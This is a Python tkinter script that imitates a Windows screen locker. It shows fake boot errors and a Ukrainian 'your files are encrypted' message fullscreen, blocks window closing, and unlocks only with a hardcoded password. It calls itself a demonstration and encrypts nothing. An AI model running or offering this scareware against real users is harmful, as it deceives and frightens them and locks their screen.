
from tkinter import *
from tkinter import messagebox
import random

WHITE = "white"
RED = "red"
BLACK = "black"
BLUE = "blue"

password = "ziD#^TafeOaRjI^9Z@aK"

root = Tk()
root.title("WinLock")
root.attributes("-topmost", True)

w = root.winfo_screenwidth()
h = root.winfo_screenheight()

root.geometry(f"{w}x{h}")
root.configure(bg=BLACK)
root.attributes("-fullscreen", True)

lines = [
    "Booting windows...",
    "Boot error: 0x03527737",
    "Boot error: 0x0266712",
    "Boot error: 0x02897593",
    "Boot error: 0x01447812",
    "Boot error: 0x0150974",
    "Boot error: 0x03873700",
    "Boot error: 0x0700882",
    "Boot error: 0x03803618",
    "Memory section at address 0x0424* is locked!",
    "Service UCRYPTED started.",
    "",
    "  * Windows blocked!"
]

labels = []

for line in lines:
    label = Label(
        root,
        text=line,
        font=("Courier New", 16, "bold"),
        fg=WHITE,
        bg=BLACK,
        anchor="w"
    )
    labels.append(label)


def show_line(index):
    if index >= len(labels):

        root.after(300, turn_red)
        return

    label = labels[index]
    label.place(x=10, y=10 + index * 25)

    if "Boot error" in lines[index]:
        delay = random.randint(20, 60)
    else:
        delay = random.randint(200, 400)

    root.after(delay, lambda: show_line(index + 1))


def turn_red():
    for label in labels:
        label.config(fg=RED)

def check_password():
    entered_password = password_entry.get()

    if entered_password == password:
        messagebox.showinfo(
            "Password correct."
        )
        root.destroy()
    else:
        messagebox.showerror(
            "Помилка",
            "Неправильний пароль!"
        )
        password_entry.delete(0, END)
        password_entry.focus_set()

def show_menu():
    root.configure(bg=BLUE)

    frame = Frame(
        root,
        bg=BLUE,
        highlightbackground=RED,
        highlightthickness=3,
        padx=45,
        pady=30
    )
    frame.place(relx=0.5, rely=0.5, anchor="center")

    Label(
        frame,
        text="WINLOCKER",
        font=("Consolas", 25, "bold"),
        fg=WHITE,
        bg=BLUE
    ).pack(pady=(0, 25))

    Label(
        frame,
        text="Ваші файли зашифровані!",
        font=("Consolas", 22, "bold"),
        fg=WHITE,
        bg=BLUE
    ).pack(pady=(0, 25))

    Label(
        frame,
        text="Демонстраційний екран WinLocker",
        font=("Consolas", 14),
        fg=WHITE,
        bg=BLUE
    ).pack(pady=(0, 30))

    Label(
        frame,
        text="Введіть код розблокування:",
        font=("Consolas", 15),
        fg=WHITE,
        bg=BLUE
    ).pack(pady=(0, 12))

    global password_entry

    password_entry = Entry(
        frame,
        font=("Consolas", 18),
        bg="#FFFFFF",
        fg=BLUE,
        insertbackground=BLUE,
        relief=FLAT,
        width=30,
        show="*"
    )
    password_entry.pack(pady=(0, 25), ipady=9)

    Button(
        frame,
        text="ENTER",
        font=("Consolas", 15, "bold"),
        bg=WHITE,
        fg=BLUE,
        activebackground="#ffffff",
        activeforeground=BLUE,
        relief=FLAT,
        cursor="hand2",
        command=check_password,
        padx=35,
        pady=10
    ).pack()

    password_entry.bind(
        "<Return>",
        lambda event: check_password()
    )
    password_entry.focus_set()


def Quit():
    pass


root.protocol("WM_DELETE_WINDOW", Quit)

show_line(0)
root.after(2300, show_menu)

root.mainloop()
